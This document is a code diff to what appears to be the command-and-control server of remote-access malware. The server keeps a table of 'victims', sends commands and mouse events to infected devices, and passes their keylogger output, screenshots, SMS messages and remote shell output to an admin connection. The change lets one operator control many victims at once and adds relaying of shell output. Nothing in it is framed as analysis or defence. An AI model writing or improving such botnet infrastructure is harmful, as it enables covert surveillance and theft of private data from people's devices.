@@ -26,7 +26,7 @@ const portM = 4001
 const ipB = "0.0.0.0"
 const ipM = "0.0.0.0"
 let adminSoc = null;
-let victim = null
+const activeVictims = new Map(); // deviceId -> socket
 // Variables
 
 // Express
@@ -63,7 +63,11 @@ app.post("/info", async (req, res) => {
     var { data: data, error: err } = await superBase.from("victims").select("*").eq("ID", req.body.id)
     if (!(err || data.length == 0)) {
         res.json(data[0])
-        victim = botIo.sockets.sockets.get(req.body.id)
+        // Add device to active victims map
+        const deviceSocket = botIo.sockets.sockets.get(req.body.id)
+        if (deviceSocket) {
+            activeVictims.set(req.body.id, deviceSocket)
+        }
     }
 })
 
@@ -77,13 +81,21 @@ app.post("/send", async (req, res) => {
         botIo.emit("ping", req.body.args)
     } else {
         try {
-            victim.emit(req.body.emit, req.body.args)
+            // Get specific device socket from activeVictims
+            const targetSocket = activeVictims.get(req.body.id)
+            if (targetSocket) {
+                targetSocket.emit(req.body.emit, req.body.args)
+            } else {
+                res.status(404).send("Device not found")
+                return
+            }
         } catch (error) {
+            // Clean up disconnected device
             await superBase.from("victims")
                 .delete()
-                .eq("ID", victim.id)
+                .eq("ID", req.body.id)
+            activeVictims.delete(req.body.id)
             getRemaining()
-            victim = null
         }
     }
     res.status(200).send("Good")
@@ -128,33 +140,29 @@ botIo.on("connection", async (socket) => {
         await superBase.from("victims")
             .delete()
             .eq("ID", socket.id)
+        // Remove from active victims
+        activeVictims.delete(socket.id)
         console.log(chalk.redBright(`[x] Bot Disconnected (${socket.id})`))
         getRemaining()
     })
 
     socket.on("logger", (data) => {
-        try {
-            adminSoc.emit("logger", data)
-        } catch (err) {
-            console.error(err)
-        }
+        if (adminSoc) adminSoc.emit("logger", { deviceId: socket.id, data })
     })
 
     socket.on("img", (data) => {
-        try {
-            adminSoc.emit("img", data)
-        } catch (err) {
-            console.error(err)
-        }
+        if (adminSoc) adminSoc.emit("img", { deviceId: socket.id, imageData: data })
     })
 
     socket.on("sms", (data) => {
-        try {
-            adminSoc.emit("sms", data)
-        } catch (err) {
-            console.error(err)
-        }
+        if (adminSoc) adminSoc.emit("sms", { deviceId: socket.id, data })
     })
+
+    socket.on("shellOut", (data) => {
+        if (adminSoc) adminSoc.emit("shellOut", { deviceId: socket.id, output: data })
+    })
+
+
 
 
 })
@@ -174,7 +182,11 @@ masterIo.on("connection", (socket) => {
         })
 
         socket.on("mouse", (data) => {
-            victim.emit("mouse", data)
+            // Route mouse events to specific device
+            const targetSocket = activeVictims.get(data.deviceId)
+            if (targetSocket) {
+                targetSocket.emit("mouse", data)
+            }
         })
 
     } else {
